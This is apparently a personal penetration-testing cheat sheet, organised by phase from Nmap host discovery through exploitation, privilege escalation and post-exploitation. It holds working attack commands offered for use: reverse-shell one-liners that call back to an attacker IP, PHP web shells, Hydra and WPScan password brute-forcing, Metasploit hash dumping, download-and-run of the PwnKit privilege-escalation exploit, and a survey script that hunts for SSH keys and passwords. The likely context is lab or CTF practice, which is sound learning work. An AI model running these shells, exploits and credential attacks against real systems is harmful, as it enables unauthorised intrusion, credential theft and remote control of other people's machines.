---
date: "2025-08-29"
layout: "single"
hidemeta: true
---
# 🎯 Overview

Standard penetration testing methodology:

## 📋 Methodology Phases

1. **🔍 Host Discovery** - Identify live hosts and network topology
2. **🔎 Service Scanning** - Enumerate open ports and running services  
3. **⚡ Gain Access/Exploit** - Exploit vulnerabilities to gain initial access
4. **🛠️ Post-Exploitation** - Maintain access and escalate privileges
   - **📊 Survey** - Gather information about the compromised system
   - **⬆️ PrivEsc** - Escalate privileges to higher-level accounts
5. **🔄 Pivot** - Use compromised systems to access additional networks

## 📚 Reference Frameworks

- [Unified Kill Chain](https://www.unifiedkillchain.com/) - Comprehensive attack framework
- [MITRE ATT&CK](https://attack.mitre.org/) - Adversarial tactics and techniques
- [Lockheed Martin Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html) - Original kill chain methodology

# 🔍 Host Discovery

Host discovery is the first phase of network reconnaissance, focused on identifying live hosts within a target network.

## 🗺️ NMAP: `-P*`

Nmap is the industry-standard network discovery and security auditing tool.

**References:**
- [Nmap Manual](https://linux.die.net/man/1/nmap)
- [Subnet Calculator](https://subnetcalculator.net/)

### ⚙️ Helpful Options

- `-sn` (skip port scan) is a technique to quickly find live hosts. It avoids port scanning, which saves time and reduces network traffic.
- `--reason` explains why a particular result is determined
- `-vvv` increases verbosity
- `-dd` debug mode
- `-A` equivalent to `-sV -O -sC --traceroute`

#### 💾 Saving Results

Filtering out live hosts for `-iL`:

```bash
# Find and save live hosts
sudo nmap -sn -oA host_disc

# Strip out live hosts
grep 'Status: Up' *.gnmap | awk '{print $2}' > live_hosts.txt

# Use that list
sudo nmap -sn -iL live_hosts.txt
```
#### 🌐 DNS Lookups

- `-n`: Do **NOT** try to reverse-DNS lookup hosts
- `-R`: Do try to reverse-DNS lookup hosts, even offline ones
    - Use `--dns-servers` to specify the DNS server

### 🎯 Default Probes

These are run in parallel:

|                | **Local**    | **Remote**                                                                                               |
| :------------- | :----------- | :------------------------------------------------------------------------------------------------------- |
| **Normal**     | ARP requests | - TCP connect 3-way handshake: <br>  - SYN to port 80 <br>  - SYN to port 443                            |
| **Privileged** | ARP requests | - ICMP 8 echo request <br>- ICMP 13 timestamp request <br>- TCP ACK to port 80 <br>- TCP SYN to port 443 |

### 🔗 ARP: -PR

- Works on local networks only (checked via routing table and network interfaces with subnet match)
- VERY reliable
- Force ARP `-PR` vs. force IP-only `--send-ip`
  - e.g., `sudo nmap -PR -sn <TARGET>` will do only ARP pings on the local network 

### 📡 ICMP: -PE/-PP/-PM

| Flag  | Scan Type                        | Description                                                                                                                                                                         |
| :---- | :------------------------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-PE` | ICMP Echo Request (type 8)       | Sends a standard ICMP Echo Request packet (ping). If a host is up, it will respond with an ICMP Echo Reply (type 0).                                                                |
| `-PP` | ICMP Timestamp Request (type 13) | Sends a timestamp request packet to the target. An up host will respond with a timestamp reply (type 14). This is often used to bypass firewalls that block standard echo requests. |
| `-PM` | ICMP Netmask Request (17)        | Sends a netmask request packet to the target. A host that is up and responds will send back a netmask reply (type 18). This is another technique to evade simple filters.           |

#### 🛡️ Windows Firewall Behavior

Usually for this firewall rule "File and Printer Sharing (Echo Request - ICMPv4-In)"

| Network Profile | ICMP Echo (Type 8)                                         | ICMP Timestamp (Type 13)                                   |
| :-------------- | :--------------------------------------------------------- | :--------------------------------------------------------- |
| **Public**      | **Blocked.** (Default behavior to prevent reconnaissance.) | **Blocked.** (Default behavior to prevent reconnaissance.) |
| **Private**     | **Allowed.** (Default rule enabled for troubleshooting.)   | **Blocked.** (No default rule to allow this traffic.)      |
| **Domain**      | **Allowed.** (Default rule enabled for troubleshooting.)   | **Blocked.** (No default rule to allow this traffic.)      |

### 🔌 TCP SYN/ACK: -PS/-PA

Specify ports by giving a number after the TCP scan type like `-PS<port(s)>`

# 🔎 Service Scanning

Service scanning involves identifying open ports and determining what services are running on target hosts.

## 🗺️ NMAP: `-s*`

Nmap's service scanning options (`-s*`) provide various techniques for port scanning and service detection.

| Category                 | Option                       | Description                                                                                                                                   |
| :----------------------- | :--------------------------- | :-------------------------------------------------------------------------------------------------------------------------------------------- |
| **Port Specification**   | `-p<portlist>`               | Scans specific ports or ranges. `p22,80,443` (list), `p1-1023` (range), `p-` (all ports)                                                      |
|                          | `-F`                         | **Fast mode:** Scans the top 100 most common ports.                                                                                           |
|                          | `--top-ports <NUMBER>`       | Scans the specified number of most common ports.                                                                                              |
| **Timing & Performance** | `-T<0-5>`                    | Sets a timing template. `0` is slowest (paranoid) for IDS, `3` is default (normal), `4` is recommended for CTFs, and `5` is fastest (insane). |
|                          | `--min-rate <NUMBER>`        | Sets the min packets **per second**                                                                                                           |
|                          | `--max-rate <NUMBER>`        | Sets the max packets **per second**                                                                                                           |
| **Probing Parallelism**  | `--min-parallelism <NUMBER>` | Sets the min number of probes to run in parallel                                                                                              |
|                          | `--max-parallelism <NUMBER>` | Sets the max number of probes to run in parallel                                                                                              |

The `-Pn` skips the host discovery phase and assumes the machine is up.

By default, `nmap` scans the top 1,000 ports. `-F` scans top 100 instead (equivalent to `--top-ports 100`).

| State             | Description                                                                            |
| :---------------- | :------------------------------------------------------------------------------------- |
| `Open`            | A service is listening on the port                                                     |
| `Closed`          | No service is listening, but the port is accessible                                    |
| `Filtered`        | A firewall is blocking Nmap from reaching the port                                     |
| `Unfiltered`      | Nmap can't determine the state, but the port is accessible (seen with `-sA` ACK scans) |
| `Open/Filtered`   | Nmap can't tell if the port is open or blocked by a firewall                           |
| `Closed/Filtered` | Nmap can't tell if the port is closed or blocked by a firewall                         |

### 🔌 TCP: `-sT`/`-sS`

- open: SYN/ACK received
- filtered: nothing or FAKE RST received
- closed: RST received

### 🚫 Malformed Scans (Negative Tests)

Typically, malformed scans are useful as follow-up scans (after a -sT/-sS/-sU) because the OS can be fingerprinted. If everything is "filtered" (i.e., no response), these scans might reveal more information (assuming no modern firewall or IDS is present -- **works best for stateless firewalls**).

These can be thought of as negative scans since responses are normally only sent/received when the port is **closed**. Open ports cannot be confirmed with these types of scans alone. However, any traffic from a host can be used for host discovery rather than enumeration.

| OS / Device        | Behavior with malformed TCP packets (NULL/FIN/Xmas) | Notes |
|--------------------|-----------------------------------------------------|-------|
| **Unix/Linux (RFC-compliant)** | - **Open port** → No response<br>- **Closed port** → RST sent | Matches RFC 793, used by Nmap to infer open vs. closed ports |
| **Windows (all modern versions)** | Always sends RST, regardless of port state | Breaks RFC; all ports appear **closed** during NULL/FIN/Xmas scans |
| **Cisco devices** | Typically send RST to any malformed packet | Similar to Windows; non-RFC-compliant |
| **IBM OS/400 & some others** | Respond with RST to all malformed probes | Causes false “closed” results |
| **Firewalls / IDS/IPS** | Often drop malformed probes silently | Can cause ports to appear **filtered** instead |

**Ignoring** the information from the table above, the following scans all have the same **generalized** outcomes except where noted:

| State           | Description                      |
| :-------------- | :------------------------------- |
| `Open/Filtered` | No response or firewalled        |
| `Filtered`      | ICMP "Port Unreachable" received |
| `Closed`        | `RST`  received                  |

#### 🚫 Null: `-sN` (FW evasion)

TCP scan with **no** TCP flags set

#### 🚫 Fin: `-sF` (FW evasion)

TCP scan with **only** FIN flag set; FIN is meant to gracefully close a session

#### 🚫 Xmas: `-sX` (FW evasion)

TCP scan with **all** FIN/PSH/URG flags set

#### 🚫 Maimon: `-sM` (Obsolete)

TCP scan with FIN/ACK. **Note:** This scan is mostly useless since a RST packet should always be sent. This was only contrary and therefore useful for BSD systems in the 90s, which would sometimes drop packets for open ports.

#### 🔍 ACK: `-sA` (FW rule scan)

TCP scan with ACK. This scan is useful to **map out firewall rules**.

| State          | Description                                                                                                                                        |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Unfiltered** | `RST` packet received. The port is **accessible**, indicating it's not blocked by a firewall. But *Nmap cannot tell if the port is open or closed* |
| **Filtered**   | The port is **not accessible**, meaning a firewall or other security device is blocking the ACK probe. This indicates that the port is filtered.   |

#### 🚫 Window: `-sW` (FW rule scan)

TCP scan that examines the window sizes of the response packets. Mostly, it is **unreliable** although it is used for FW rules.

| State        | Description                                                                          |
| :----------- | :----------------------------------------------------------------------------------- |
| `Closed`     | `RST` packet received with non-zero TCP window size. The port is **closed**          |
| `Filtered`   | No response. The port is filtered by a firewall                                      |
| `Unfiltered` | This port is not blocked by a firewall, but whether it is open or closed is unknown. |

#### 🚫 Zombie/Idle/Anonymous Scan: `-sI` (Obsolete)

A stealthy TCP scan that uses a third-party "zombie" host to scan a target on the attacker's behalf. It is **unreliable** and **obsolete** for modern systems.

|State|Description|
|---|---|
|`Open`|The IP ID of the zombie host increments by 2, indicating the target port is open.|
|`Closed`|The IP ID of the zombie host increments by 1, indicating the target port is closed.|
|`Filtered`|The IP ID of the zombie host increments by 1, indicating the target port is filtered.|

```
# MANDATORY: See if host uses incremental IP ID
nmap --script ipidseq -p <OPEN_PORT> <ZOMBIE_IP>

# Scan
nmap -Pn -sI <ZOMBIE_IP> <TARGET_IP>
```

### 🥷 Network Evasion Techniques

**IP and MAC Address Spoofing:**
- `-S` - Spoof source IP address
- `--spoof-mac` - Spoof MAC address
- `-e` - Specify network interface
- **Purpose**: Hides the scanner's true identity to evade internal security and logging

**Decoy Scanning:**
- `-D X.X.X.X,RND,ME,RND` - Makes a scan appear to come from multiple IP addresses
- **Purpose**: Makes it harder to pinpoint the attacker

**Packet Fragmentation:**
- `-f` - Fragment packets
- `--mtu` - Specify MTU size
- **Purpose**: Evades detection by older security devices

**Appending Data:**
- `--data-length` - Add bytes to packets
- **Purpose**: Makes packets appear like legitimate traffic

### 📡 UDP: `-sU`

UDP scanning is slower and less reliable than TCP scanning due to the connectionless nature of UDP.

```bash
sudo nmap -sU --top-ports 20 -v  # UDP is slow and unreliable
```

|State|Description|
|---|---|
|`Open`| Response from the service (requires proper service request) |
|`Closed`| No response received |
|`Filtered`| ICMP "Port Unreachable" received|

### 📜 Nmap Scripting Engine (NSE)

The Nmap Scripting Engine (NSE) extends Nmap's functionality with custom scripts for vulnerability detection, service enumeration, and exploitation.

**Reference:** [NSE Usage Guide](https://nmap.org/book/nse-usage.html)

#### 📖 How to Use NSE

**Basic Usage:**
- `-sC` - Run a set of popular, common scripts
- `--script` - Run specific scripts by name, category, or file path
- `--script-help` - Show arguments for `--script-args`

**Advanced Usage:**
- Combine scripts with wildcards: `--script "smb-*,http-*"`
- Use comprehensive documentation: [NSE Script Database](https://nmap.org/nsedoc/scripts/)
- Search for scripts: `grep "ftp" /usr/share/nmap/scripts/script.db`

```bash
nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php' <TARGET>
```

##### 📂 Script Categories

Location: `/usr/share/nmap/scripts`

| Category | Description |
| :--- | :--- |
| **auth** | Scripts related to authentication, such as bypassing credentials or checking for default ones. |
| **broadcast** | Used to discover hosts on the local network by broadcasting requests. |
| **brute** | Scripts that perform brute-force attacks to guess passwords or credentials. |
| **default** | The core set of scripts that are run automatically with `-sC` or `-A`. |
| **discovery** | Actively gathers more information about a network, often using public registries or protocols like SNMP. |
| **dos** | Tests for vulnerabilities that could lead to a denial-of-service attack. |
| **exploit** | Actively attempts to exploit known vulnerabilities on a target system. |
| **external** | Interacts with external services or databases. |
| **fuzzer** | Sends unexpected or randomized data to a service to find bugs or vulnerabilities. |
| **intrusive** | These scripts can be noisy, resource-intensive, or potentially crash the target system. |
| **malware** | Scans for known malware or backdoors on a target host. |
| **safe** | Scripts that are considered safe to run as they are not designed to crash services, use excessive resources, or exploit vulnerabilities. |
| **version** | Extends the functionality of Nmap's version detection feature. |
| **vuln** | Checks a target for specific, known vulnerabilities. |

#### 📥 Install New Script

```bash
sudo wget --output-file /usr/share/nmap/scripts/<SCRIPT>.nse \
    https://svn.nmap.org/nmap/scripts/<SCRIPT>.nse

nmap --script-updatedb
```

### 💡 Example Scans

```bash
# Service Versioning; Note: establishes full TCP connection
sudo nmap -n -Pn -sV <TARGET>

# OS Guess
sudo nmap -n -Pn -O <TARGET>

# Traceroute
sudo nmap -n -Pn -sn --traceroute <TARGET>

# Comprehensive scan with scripts, versioning, and OS detection
sudo nmap -Pn -n -sC -sV -O -T4 -oA nmap_scan <target_ip>

# Basic SYN scan against the top 5000 ports
sudo nmap -Pn -sS -p-5000 -oA syn_scan <target_ip>

# TCP connect scan against a single port (e.g., 80)
sudo nmap -Pn -sT -p 80 -oA tcp_conn_80 <target_ip>

# Xmas scan, assuming host is up, on the first 999 ports
sudo nmap -Pn -sX -p-999 -oA xmas_scan <target_ip>

# ICMP echo ping scan to check if a host is up
sudo nmap -sn -PE <target_ip>

# TCP SYN ping on port 443 to check if a host is up
nmap --disable-arp-ping -PS <target_ip>

# Check for anonymous FTP login
sudo nmap -Pn --script ftp-anon <target_ip>

# Scan SMB ports for information and vulnerabilities
nmap -p 137,139,445 --script nbstat,smb-os-discovery,smb-enum-shares,smb-enum-users <target_ip>

# Advanced Scans
nmap -sS -p53 <NETBLOCK>
nmap -sU -p53 <NETBLOCK>
nmap -Pn -n -sS -sV \
  --max-retries 1 \
  --host-timeout 45s \
  --initial-rtt-timeout 300ms \
  --max-rtt-timeout 1000ms \
  -p 21,22,23,25,53,80,110,135,139,443,445,3389 \
  <TARGET>

# whois
nmap -n -Pn -sn --script whois-domain <TARGET_DOMAIN>

# Discovers the operating system, computer name, and domain of a target 
# via the SMB protocol.
nmap -p 445 --script smb-os-discovery <TARGET>

#### SMB Share Enumeration
```bash
# Attempts to list available SMB shares on the target
nmap -p 445 --script smb-enum-shares <TARGET>
```

#### Additional Service Scans
```bash
# DNS service discovery
sudo nmap -sU -Pn -n -p 53 --script=dns-recursion,dns-service-discovery <TARGET>

# NTP information gathering
sudo nmap -sU -Pn -n -p 123 --script=ntp-info <TARGET>

# SNMP enumeration
sudo nmap -sU -Pn -n -p 161 --script=snmp-info <TARGET>
sudo nmap -sU -Pn -n -p 161 --script=snmp-brute <TARGET>

# NetBIOS name service
sudo nmap -sU -Pn -n -p 137 --script=nbstat <TARGET>

# DHCP discovery
sudo nmap -sU -Pn -n -p 67 --script=dhcp-discover <TARGET>

# TFTP enumeration
sudo nmap -sU -Pn -n -p 69 --script=tftp-enum <TARGET>

# SSDP discovery
sudo nmap -sU -Pn -n -p 1900 --script=ssdp-discover <TARGET>

# IKE version detection
sudo nmap -sU -Pn -n -p 500 --script=ike-version <TARGET>
```

## 🌐 DNS

- DNSDumpster: https://dnsdumpster.com/
- Shodan.io: https://www.shodan.io/dashboard?language=en

```bash
whois <TARGET>

dig +short @<DNS_SERVER> <TARGET> <RECORD_TYPE>
# --- Record Types ---
# ANY: return all records -- sometimes doesnt work!
# A: IPv4 address
# AAAA: IPv6 address
# CNAME: Canonical Name
# MX: Mail Servers
# NS: Name Servers
# PTR: Pointer Record
# SOA: Start of Authority
# TXT: Text Records
# SRV: Service Records
# CAA: Certification Authority Authorization
for type in A AAAA CNAME MX NS SOA SRV TXT ; do echo '---' ; dig +short $type <TARGET> ; done

# IP -> DNS
dig -x <IP_ADDR>

# RARE: DNS Zone Transfer
dig axfr @<DNS_SERVER> <TARGET>

# RARE: older DNS query
dig @<DNS_SERVER> +noedns +nocookie +norecurse <TARGET>
# EDNS breaks on Win, norecurse usu for internal networks
```

## 🏢 SMB / LDAP / Kerberos

```bash
# Perform a full enumeration of a target using enum4linux
enum4linux -a <TARGET>

# List available SMB shares for a given host
smbclient -L //<TARGET>/ -U <USERNAME>

# Connect to an SMB share with a null session (no password)
smbclient -N //<TARGET>/<SHARE>

# SMB enumeration:
sudo nmap -p 445 --script "smb-enum-domains,smb-os-discovery" <TARGET>

# LDAP-based enumeration
# Useful when SMB queries are blocked or hardened.
sudo nmap -p 389 --script ldap-search --script-args 'ldap.search.base="",ldap.search.filter="(objectClass=*)",ldap.search.attributes="namingContexts"' <TARGET>

# DNS / Start of Authority
dig @<TARGET> SOA
```

## 🌍 Web

### 🦊 Browser-based Reconn (Firefox)

- Proxy: https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
- User-Agent: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/
- Techs used by website: https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
- Developer Tools: F12

### 🔍 Gobuster

```bash
# Directory brute-force with a common wordlist
gobuster dir --threads 20 --wordlist /usr/share/wordlists/dirb/common.txt --url <TARGET>

# Directory brute-force using a larger wordlist and showing expanded URLs
gobuster dir --output gobuster --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --url <TARGET>
```

### 🔍 Wpscan

```bash
# Enumerate Wordpress users
wpscan --url http://<USER>/ --enumerate u

# Brute-force creds
2025-08-19 18:26:03 -- wpscan --url http://<TARGET>/ --passwords <PASSWORDS_FILE> --usernames <USERS_FILE> --password-attack wp-login
```

### 🔤 URL Encode String

```bash
echo '<COMMAND>' | python3 -c 'import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))'
```

### 🌐 Interacting with Web Servers using cURL
```bash
# Fetch a webpage's content to standard output
curl -o- <TARGET>

# Fetch only the HTTP headers of a webpage
curl -I <TARGET>

# Attempt to upload a file to a web server
curl --upload-file <PHP_FILE> <TARGET>/<FILENAME>

# Execute a command via a webshell parameter, ensuring the command is URL encoded
curl -o- 'http://<TARGET>/uploads/shell.phtml?cmd=ls%20-la'
```

# ⚡ Gain Access/Exploit

The exploitation phase focuses on gaining initial access to target systems through various attack vectors.

## 💥 Brute-Forcing

### 🔨 Brute-Forcing Web & SSH Logins with Hydra
```bash
# Brute-force a web login form
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

# Brute-force a Wordpress login form with a complex request string
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username' -V

# Brute-force an SSH login for a specific user
hydra -t 4 -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET>:<PORT>
```

## 🎯 Metasploit / Meterpreter

### 🔍 Search (for too many results)

```bash
searchsploit "<SERVICE_VERSION>" | grep -iE 'remote|rce|privilege|lpe|code execution|backdoor' | grep -vE 'dos|denial|poc'
```

### 📊 Survey

```bash
sysinfo
getuid
getpid
ipconfig
ps
run winenum
run post/windows/gather/checkvm
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
# --- Privilege Escalation & Credential Gathering ---
run post/windows/gather/smart_hashdump
run post/multi/recon/local_exploit_suggester
```

### 🎯 Finding and Executing Exploits
```bash
# Search for exploits related to a specific keyword
search type:exploit <KEYWORD>

# Set the target host(s) for the exploit
setg RHOSTS <TARGET>
setg PORT

# Set the payload for the exploit
set payload php/meterpreter/bind_tcp

# Run the configured exploit
run
```

## 🐚 Reverse & Bind Shells

### 💻 Shell One-Liners

#### 👂 LISTENER

```bash
nc -vnlp <PORT>
```

#### 📞 CALLBACK Shells

```bash
# Simple bash reverse shell
bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1

# Python reverse shell
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<KALI_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# Reverse shell using a named pipe (fifo)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <KALI_IP> <PORT> > /tmp/f
```

### 🐘 PHP Web Shells

#### 📤 Upload command executor
```php
<?php system($_GET['cmd']); ?>
```
#### ▶️ Run commands
```bash
curl http://<TARGET>/cmd.php?cmd=echo 'hi there'
```

---

#### 👂 Start Listener
```bash
nc -lvnp 54321
```

#### 📤 Upload reverse shell to execute netcat
**MAKE SURE NETCAT IS ON TARGET**
```php
<?php
  $cmd = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 54321 > /tmp/f";
  system($cmd);
?>
```

# 🛠️ Post-Exploitation

Post-exploitation focuses on maintaining access, gathering information, escalating privileges, and preparing for lateral movement.

## ⬆️ Shell Upgrades

```bash
# Meterpreter
execute -f 'python -c "import pty; pty.spawn(\"/bin/bash\")"' -i -t

# Upgrade a simple shell to a more interactive PTY
python2 -c 'import pty; pty.spawn("/bin/sh")'
python2 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Stabilize a shell from terminal escape commands
stty raw -echo; fg
```

### 🔧 Socat Shell Upgrade

```bash
# LOCAL: download and serve static socat
cd /tmp
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
ip a ; python3 -m http.server 8000
socat file:`tty`,raw,echo=0 tcp-listen:<PORT>

# REMOTE: Use socat to connect back to the listener and spawn a shell
curl -o socat http://<KALI_IP>:8000/socat
chmod +x socat
./socat tcp-connect:<KALI_IP>:<PORT> exec:'bash -li',pty,stderr,setsid,sigint,sane
```

## 🐧 Linux Survey

```bash
#!/bin/bash

# ===============================================================
# ===      FINAL, FOCUSED & ROBUST LINUX PRIV-ESC SURVEY      ===
# ===============================================================

# --- Configuration: Add binaries to ignore to these lists, separated by "|" ---
SUID_IGNORE_LIST="chsh|gpasswd|newgrp|chfn|passwd|sudo|su|ping|ping6|mount|umount|Xorg\.wrap|ssh-keysign"
SGID_IGNORE_LIST="wall|ssh-agent|mount|umount|utempter"

# --- Main Survey Execution ---
(
echo "===== WHO AM I? =====";
whoami; id; pwd; hostname;

echo -e "\n===== OS & KERNEL INFO =====";
uname -a;
cat /etc/issue;
cat /etc/os-release;

echo -e "\n===== INTERESTING SUID FILES (FILTERED) =====";
echo "Review this list carefully. Check GTFOBins for each binary: https://gtfobins.github.io/";
find / -perm -u=s -type f 2>/dev/null | grep -vE "/(${SUID_IGNORE_LIST})$";

echo -e "\n===== INTERESTING SGID FILES (FILTERED) =====";
find / -perm -g=s -type f 2>/dev/null | grep -vE "/(${SGID_IGNORE_LIST})$";

echo -e "\n===== LINUX CAPABILITIES (MODERN PRIVESC) =====";
echo "Check GTFOBins for any binary with '+ep' privileges.";
getcap -r / 2>/dev/null;

echo -e "\n===== WORLD-WRITABLE FILES & DIRECTORIES =====";
find / -type d -perm -0002 -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null;
find / -type f -perm -0002 -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null;

echo -e "\n===== DIRECTORY CONTENTS =====";
echo "--- Current Folder (from messy exploit) ---";
ls -la .;
echo "--- Root Filesystem ---";
ls -la /;
echo "--- Current User's Home (\$HOME) ---";
ls -la $HOME;
echo -e "\n--- All Users in /home ---";
for user_dir in /home/*; do
  if [ -d "${user_dir}" ]; then
    echo -e "\n[+] Contents of ${user_dir}:";
    ls -la "${user_dir}";
  fi
done;

echo -e "\n===== RUNNING PROCESSES =====";
ps aux;

echo -e "\n===== CRON JOBS / SCHEDULED TASKS =====";
ls -la /etc/cron*;
cat /etc/crontab;

echo -e "\n===== NETWORK INFO & OPEN PORTS (LOCAL) =====";
# Failsafe: Tries to use netstat, but falls back to ss if it's not available.
command -v netstat &>/dev/null && netstat -tulpn || ss -tulpn;

echo -e "\n===== CAN I RUN SUDO? (NON-INTERACTIVE CHECK) =====";
sudo -n -l;

echo -e "\n===== SENSITIVE CONTENT SEARCH (LAST - CAN BE NOISY) =====";
echo "--- id_rsa ---"
find /home -name "id_rsa*" 2>/dev/null;
echo "--- grep pass ---"
grep --color=auto -rni "password\|pass" /etc /var/www /home 2>/dev/null;

echo -e "\n===== SURVEY COMPLETE =====\n";

) 2>&1 | tee /tmp/linux_survey_output.txt
```

```bash
# Retrieve survey
scp -P <PORT> <USER>@<IP_ADDR>:/tmp/linux_survey_output.txt /tmp/
```

## 🚫 No Netstat nor SS

Sometimes, some routers or mini-environments might not have the full core utils suite. As long as `/proc/net` is readable, then it is also parsable with the following monstrosity.

### 🔌 TCP and TCP6 Manual Netstat (no UDP)

```bash
{ printf "%-8s %-22s %-22s %-12s %s\n" "Proto" "Local Address" "Remote Address" "State" "PID/Program Name"; awk 'function hextodec(h,r,i,c,v){h=toupper(h);r=0;for(i=1;i<=length(h);i++){c=substr(h,i,1);if(c~/[0-9]/)v=c;else v=index("ABCDEF",c)+9;r=r*16+v}return r} function hextoip(h,ip,d1,d2,d3,d4){if(length(h)==8){d1=hextodec(substr(h,7,2));d2=hextodec(substr(h,5,2));d3=hextodec(substr(h,3,2));d4=hextodec(substr(h,1,2));return d1"."d2"."d3"."d4}if(length(h)>8){if(hextodec(h)==0)return"::";if(substr(h,1,24)=="0000000000000000FFFF0000"){h=substr(h,25,8);d1=hextodec(substr(h,7,2));d2=hextodec(substr(h,5,2));d3=hextodec(substr(h,3,2));d4=hextodec(substr(h,1,2));return"::ffff:"d1"."d2"."d3"."d4}return h}} NR>1{split($2,l,":");split($3,r,":");lip=hextoip(l[1]);lport=hextodec(l[2]);rip=hextoip(r[1]);rport=hextodec(r[2]);sm["01"]="ESTABLISHED";sm["0A"]="LISTEN";if($4 in sm){if(FILENAME~/tcp6/)p="tcp6";else p="tcp";printf"%-8s %-22s %-22s %-12s %s\n",p,lip":"lport,rip":"rport,sm[$4],$10}}' /proc/net/tcp /proc/net/tcp6 | while read proto laddr raddr state inode; do find_output=$(find /proc -path '*/fd/*' -lname "socket:\[$inode\]" -print -quit 2>/dev/null); if [ -n "$find_output" ]; then pid=$(echo "$find_output" | cut -d'/' -f3); pname=$(cat /proc/$pid/comm 2>/dev/null); printf "%-8s %-22s %-22s %-12s %s/%s\n" "$proto" "$laddr" "$raddr" "$state" "$pid" "$pname"; else printf "%-8s %-22s %-22s %-12s %s\n" "$proto" "$laddr" "$raddr" "$state" "-"; fi; done | sort -k4; }
```

## ⬆️ Privilege Escalation (PrivEsc)
```bash
# List your sudo privileges
sudo -l

# Find all files with SUID permission set
find / -perm -u=s -type f 2>/dev/null

# Upgrade to a root shell from vim (if sudo allows)
sudo vim -c ':!/bin/bash'
```

### 🔍 Linpeas Enumerator

* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
* https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/

```bash
# KALI
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
ip a
python3 -m http.server 8000

# TARGET
cd /tmp
wget http://<IP_ADDR>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh 2>&1 | tee linpeas_output.txt
```

```bash
# Retrieve survey
scp -P <PORT> <USER>@<IP_ADDR>:/tmp/linpeas_output.txt /tmp/
```

### 🚨 CVE-2021-4034 - Pkexec Local Privilege Escalation (privesc)
```bash
# LOCAL: Download and execute the PwnKit privesc
cd /tmp
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
ip a ; python3 -m http.server 8000

# REMOTE: Download and run privesc
curl -o PwnKit http://<KALI_IP>:8000/PwnKit
chmod +x PwnKit
./PwnKit
```

## 🔐 SSH / SCP

### 🔗 Connecting and Transferring Files
```bash
# SSH into a target using a password with sshpass (non-interactive)
sudo apt-get install -y sshpass
sshpass -p '<PASSWORD>' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 <USER>@<TARGET>

# SSH into a target using a private key identity file
ssh -i /path/to/private_key <USER>@<TARGET>

# TARGET_FILE -> KALI
scp <USER>@<TARGET>:/remote/path/to/file /local/path/

# KALI_FILE -> TARGET
scp /local/path/to/file <USER>@<TARGET>:/remote/path/
```

## 🔓 Password Cracking

### 🔨 Cracking Hashes with John and Hashcat
```bash
# Convert an SSH private key to a hash format for John the Ripper
ssh2john /path/to/id_rsa > /path/to/hash.txt

# Crack a hash file using a wordlist with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt /path/to/hash.txt
```

```bash
# Crack an MD5crypt hash with a salt using Hashcat
hashcat -O -a 0 -m 20 <HASH>:<SALT> /usr/share/wordlists/rockyou.txt

# Crack a SHA512crypt hash using Hashcat
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
```

## 🍃 MongoDB

### 💾 Interacting with the Database
```bash
# Connect to a MongoDB instance on a specific port
mongo --port 27117

# List all available databases
show dbs

# Switch to a specific database
use <DB_NAME>

# List all collections (tables) in the current database
show collections

# Find and display all documents (rows) in a collection
db.<COLLECTION>.find().pretty()

# Generate a SHA512crypt password hash to change password
openssl passwd -6 <PASSWORD>
db.admin.update({ "name" : "administrator" }, { $set: { "x_shadow" : "<HASH>" } });
```

## 🌱 Living Off the Land

Ref: https://lolbas-project.github.io/#

## 📍 Good Locations

### 🪟 Windows

| Variable                  | Description                                            | Example Value               |
|---------------------------|--------------------------------------------------------|-----------------------------|
| %windir%                  | Windows installation directory                         | C:\Windows                  |
| %SystemRoot%              | Alias for %windir%                                     | C:\Windows                  |
| %ProgramFiles%            | Default directory for 64-bit programs                  | C:\Program Files            |
| %ProgramFiles(x86)%       | Default directory for 32-bit programs on 64-bit systems| C:\Program Files (x86)      |
| %CommonProgramFiles%      | Default directory for 64-bit common files              | C:\Program Files\Common Files|
| %CommonProgramFiles(x86)% | Default directory for 32-bit common files on 64-bit systems | C:\Program Files (x86)\Common Files |
| %SystemDrive%             | Drive letter of the system partition                   | C:                          |
| %USERPROFILE%             | Path to the current user's profile directory           | C:\Users\username           |
